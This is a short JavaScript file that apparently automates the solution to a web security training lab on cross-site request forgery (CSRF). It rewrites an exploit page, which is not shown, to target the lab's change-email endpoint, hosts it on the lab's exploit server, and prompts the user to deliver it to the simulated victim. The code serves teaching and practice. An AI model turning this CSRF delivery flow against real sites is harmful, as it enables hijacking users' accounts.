import { ExploitServer } from "../../../utils/exploitServer.js";
import { getFileContent } from "../../../utils/getFileContent.js";
import { getParsedInput } from "../../../utils/getParsedInput.js";
import { runTasks } from "../../../utils/runTasks.js";
import { replaceActionAttribute } from "../utils/replaceActionAttribute.js";

const { url, httpClient } = getParsedInput({
  description:
    "Lab: CSRF where token validation depends on token being present",
  proxy: true,
});

async function task() {
  let exploit = await getFileContent("./exploit.html");
  const changeEmailUrl = url + "my-account/change-email";
  exploit = replaceActionAttribute(exploit, changeEmailUrl);

  const exploitServer = await ExploitServer.create(url, httpClient);
  exploitServer.storeExploit(exploit);

  console.log(`To solve the lab:
  1. Visit ${exploitServer.url}
  2. Press "Deliver exploit to victim" button`);
}

runTasks([task]);
